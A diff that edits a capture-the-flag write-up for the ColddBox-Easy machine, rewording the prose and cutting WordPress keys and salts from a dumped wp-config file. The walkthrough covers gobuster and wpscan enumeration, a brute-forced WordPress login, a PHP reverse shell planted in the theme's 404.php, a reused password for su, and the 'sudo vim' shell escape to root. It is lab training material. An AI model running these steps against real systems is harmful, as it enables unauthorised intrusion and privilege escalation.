@@ -30,7 +30,7 @@ An Nmap scan was performed to identify open ports and running services. The scan
 
 <img width="1680" height="970" alt="Image" src="https://github.com/user-attachments/assets/79957aaf-2aa9-47c7-ab4c-04a8b19ef879" />
 
-Explore the Source Code and options in the Website then understand the work flow of the Website then Start the Directory Scan 
+The website source code and functionality were reviewed to understand the application workflow, followed by directory enumeration.
 
 ### Gobuster (Directory Scan) :
 ```
@@ -50,19 +50,19 @@ Starting gobuster in directory enumeration mode
 /wp-includes          (Status: 301) [Size: 316]
 
 ```
-As we see the interesting directory ``` /hidden ```
+An interesting directory, ```/hidden```, was discovered during enumeration.
 
 
 <img width="1151" height="195" alt="Image" src="https://github.com/user-attachments/assets/1d8b1e73-daad-4688-856a-778e25f36f85" />
 
-Now We know the users are exists are Philip,Hugo,C0ldd.
+This page revealed usernames such as Philip, Hugo, and c0ldd.
 
 another directory ```/wp-admin``` its redirect to the ```/wp-login```
 
 <img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/93782abe-ba73-469e-94d5-61e886015c07" />
 
 
-As we can see the Website is Powered by the WORDPRESS CMS . So We run the Wpscan for Enumeration
+The application was identified as a WordPress CMS . So We run the Wpscan for Enumeration
 
 ## Wpscan
 
@@ -166,12 +166,15 @@ Interesting Finding(s):
 
 ```
 
-We run the scan of the enumrating the users and brute force the password . As it We got one user Password C0ldd : 98######## . Now log in the Website with the Credentials 
+User enumeration was performed, followed by a targeted password attack.
+Since a limited set of valid usernames was identified, a targeted password attack was feasible without performing blind brute force.
+
+As it We got one user Password C0ldd : 98######## . Now log in the Website with the Credentials 
 
 
 <img width="1680" height="971" alt="Image" src="https://github.com/user-attachments/assets/9292ee01-e8d4-4985-83f4-d93b89eba77a" />
 
-We Successfully login in the Websiter In the Wordpress there is a function name of Appearance go to the Editor Function we can see the files go to the any php files i selected the 404.php for the Reverse shell is in the PHP so delete the content in it paste the PHP reverse shell code 
+We Successfully login in the Websiter WordPress theme editor was used to modify a PHP template file, allowing server-side code execution and resulting in a reverse shell
 [Revshell](https://www.revshells.com/) go to it and give the ip address and port . paste the code in the 404.php file and click the save the content as been updated with your reverse shell 
 
 
@@ -311,55 +314,10 @@ define('DB_CHARSET', 'utf8');
 
 /** The Database Collate type. Don't change this if in doubt. */
 define('DB_COLLATE', '');
-
-/**#@+
- * Authentication Unique Keys and Salts.
- *
- * Change these to different unique phrases!
- * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
- * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
-define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
-define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
-define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
-define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
-define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
-define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
-define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
-define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');
-
-/**#@-*/
-
-/**
- * WordPress Database Table prefix.
- *
- * You can have multiple installations in one database if you give each a unique
- * prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix  = 'wp_';
-
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- */
-define('WP_DEBUG', false);
-
-/* That's all, stop editing! Happy blogging. */
-
-/** Absolute path to the WordPress directory. */
-if ( !defined('ABSPATH') )
-        define('ABSPATH', dirname(__FILE__) . '/');
-
-define('WP_HOME', '/');
-define('WP_SITEURL', '/');
-
-/** Sets up WordPress vars and included files. */
 require_once(ABSPATH . 'wp-settings.php');
+.....
+
+
 www-data@ColddBox-Easy:/var/www/html$ su c0ldd
 su c0ldd
 Password: cybersecurity
@@ -372,6 +330,10 @@ Rm##################################################
 
 ```
 We Successfully got the User.txt ✨ 
+
+### Post-Exploitation Enumeration
+After gaining a web shell, local enumeration was performed to identify users, configuration files, and potential credential reuse.
+
 
 ```
 c0ldd@ColddBox-Easy:~$ sudo -l 
@@ -403,7 +365,7 @@ If the binary is allowed to run as superuser by sudo, it does not drop the eleva
     sudo vim -c ':!/bin/sh'
 
 ```
-BOOM the Payload 
+BOOM This resulted in a root shell 🔥
 ```
 
 c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'
